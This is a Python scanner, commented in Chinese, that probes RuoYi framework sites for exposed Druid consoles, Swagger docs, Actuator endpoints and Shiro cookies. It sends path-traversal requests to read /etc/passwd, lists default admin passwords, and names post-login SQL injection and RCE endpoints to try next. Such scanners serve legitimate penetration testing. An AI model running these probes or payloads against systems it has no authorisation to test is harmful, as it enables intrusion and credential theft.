#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
若依(RuoYi)框架漏洞检测脚本
检测无需登录即可利用的漏洞
"""

import requests
import urllib3
import sys
from urllib.parse import urljoin

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class RuoYiScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 10

    def print_banner(self):
        print("=" * 60)
        print("若依(RuoYi)框架漏洞检测工具")
        print("目标: " + self.target)
        print("=" * 60)
        print()

    def check_ruoyi(self):
        """检测是否为若依框架"""
        print("[*] 正在识别若依框架...")

        try:
            # 直接检测当前页面
            r = self.session.get(self.target)

            # 若依框架特征关键字
            ruoyi_keywords = [
                'ruoyi', '若依', 'prod-api',
                '用户登录', '验证码', 'captchaImage',
                'public_saas', '管理系统', '事项管理',
                '申请管理', '公共服务管理', '配置管理'
            ]

            # 检查页面内容
            if any(keyword in r.text for keyword in ruoyi_keywords):
                print(f"[+] 确认为若依框架")
                print(f"[+] 检测到特征: 登录页面")
                return True

            # 额外检测常见路径
            indicators = [
                "/login",
                "/index",
                "/captchaImage",
                "/prod-api/captchaImage",
                "/prod-api/login"
            ]

            for path in indicators:
                try:
                    url = urljoin(self.target, path)
                    r = self.session.get(url)

                    if any(keyword in r.text for keyword in ruoyi_keywords):
                        print(f"[+] 确认为若依框架")
                        return True
                except:
                    continue

        except Exception as e:
            print(f"[!] 检测出错: {e}")

        print("[-] 未检测到若依框架特征")
        return False

    def check_druid_console(self):
        """检测Druid监控页面未授权访问"""
        print("\n[1] 检测Druid监控页面...")

        # 尝试不同的基础路径
        base_paths = [
            "",  # 当前路径
            "/prod-api",  # 若依常见API路径
            "/.."  # 尝试目录穿越
        ]

        druid_paths = [
            "/druid/index.html",
            "/druid/login.html",
            "/druid/websession.html"
        ]

        for base in base_paths:
            for path in druid_paths:
                try:
                    # 处理路径组合
                    if self.target.endswith('/login') or 'public_saas' in self.target:
                        # 如果是登录页面，需要回退到根目录
                        url = self.target.rsplit('/', 1)[0] + base + path
                    else:
                        url = self.target + base + path

                    r = self.session.get(url, allow_redirects=False)

                    if r.status_code == 200 and 'druid' in r.text.lower():
                        print(f"  [!] 发现Druid监控页面: {url}")
                        print(f"  [!] 尝试默认账号: ruoyi/123456")
                        return True
                except Exception as e:
                    continue

        print("  [-] 未发现Druid监控页面")
        return False

    def check_swagger(self):
        """检测Swagger接口文档"""
        print("\n[2] 检测Swagger接口文档...")

        paths = [
            "/swagger-ui.html",
            "/doc.html",
            "/swagger-ui/index.html",
            "/v2/api-docs"
        ]

        for path in paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.get(url)

                if r.status_code == 200 and ('swagger' in r.text.lower() or 'api' in r.text.lower()):
                    print(f"  [!] 发现Swagger文档: {path}")
                    print(f"  [!] 可能存在CVE-2025-7901 (XSS漏洞)")
                    return True
            except:
                continue

        print("  [-] 未发现Swagger文档")
        return False

    def check_actuator(self):
        """检测Spring Boot Actuator端点"""
        print("\n[3] 检测Actuator端点...")

        paths = [
            "/actuator",
            "/actuator/env",
            "/actuator/health",
            "/actuator/metrics",
            "/actuator/mappings"
        ]

        for path in paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.get(url)

                if r.status_code == 200:
                    print(f"  [!] 发现可访问的Actuator端点: {path}")
                    if 'env' in path or 'mappings' in path:
                        print(f"  [!] 可能泄露敏感配置信息")
                    return True
            except:
                continue

        print("  [-] 未发现可访问的Actuator端点")
        return False

    def check_default_credentials(self):
        """检测默认密码"""
        print("\n[4] 检测默认凭据...")

        login_url = urljoin(self.target, "/login")

        credentials = [
            ("admin", "admin123"),
            ("ry", "admin123"),
        ]

        print("  [*] 尝试常见默认凭据...")
        print("  [*] 注意: 此功能需要验证码，可能无法直接登录")
        print("  [*] 建议: admin/admin123, ry/admin123")

        return False

    def check_file_read(self):
        """检测任意文件读取漏洞 (需要登录)"""
        print("\n[5] 检测任意文件读取...")
        print("  [*] 此漏洞需要登录后才能利用")
        print("  [*] 影响版本: <= 4.7.8")
        print("  [*] 利用路径: /common/download/resource?resource=/profile/../../../../etc/passwd")

        # 尝试无需认证的文件读取
        paths = [
            "/common/download/resource?resource=/etc/passwd",
            "/common/download?resource=../../../../etc/passwd"
        ]

        for path in paths:
            try:
                url = urljoin(self.target, path)
                r = self.session.get(url)

                if 'root:' in r.text or '[extensions]' in r.text:
                    print(f"  [!] 存在任意文件读取漏洞!")
                    return True
            except:
                continue

        print("  [-] 未检测到无需认证的文件读取")
        return False

    def check_shiro(self):
        """检测Shiro框架特征"""
        print("\n[6] 检测Shiro反序列化漏洞特征...")

        try:
            r = self.session.get(self.target)

            # 检查rememberMe cookie
            cookies = r.cookies
            headers = r.headers

            if 'rememberMe' in str(cookies) or 'rememberMe' in str(headers):
                print("  [!] 检测到Shiro框架特征 (rememberMe)")
                print("  [!] 影响版本: < 4.6.2")
                print("  [!] 建议使用专门的Shiro漏洞检测工具")
                print("  [!] 默认密钥可能存在，需要进一步测试")
                return True
        except:
            pass

        print("  [-] 未检测到明显的Shiro特征")
        return False

    def generate_report(self):
        """生成检测报告"""
        print("\n" + "=" * 60)
        print("检测完成!")
        print("=" * 60)
        print("\n需要登录才能进一步测试的漏洞:")
        print("1. SQL注入漏洞 (/system/dept/edit, /system/role/list)")
        print("2. 定时任务RCE (/monitor/job/add)")
        print("3. 任意文件下载 (/common/download/resource)")
        print("4. Thymeleaf模板注入 (/monitor/cache/getNames)")
        print("\n建议:")
        print("- 尝试默认凭据: admin/admin123, ry/admin123")
        print("- 检查Druid控制台: ruoyi/123456")
        print("- 使用专门的Shiro扫描工具检测反序列化漏洞")

    def scan(self):
        """执行完整扫描"""
        self.print_banner()

        if not self.check_ruoyi():
            print("\n[!] 目标可能不是若依框架，继续检测...")

        # 执行各项检测
        self.check_druid_console()
        self.check_swagger()
        self.check_actuator()
        self.check_default_credentials()
        self.check_file_read()
        self.check_shiro()

        # 生成报告
        self.generate_report()


def main():
    if len(sys.argv) != 2:
        print("用法: python3 ruoyi_scanner.py <target_url>")
        print("示例: python3 ruoyi_scanner.py http://example.com")
        sys.exit(1)

    target = sys.argv[1]
    scanner = RuoYiScanner(target)
    scanner.scan()


if __name__ == "__main__":
    main()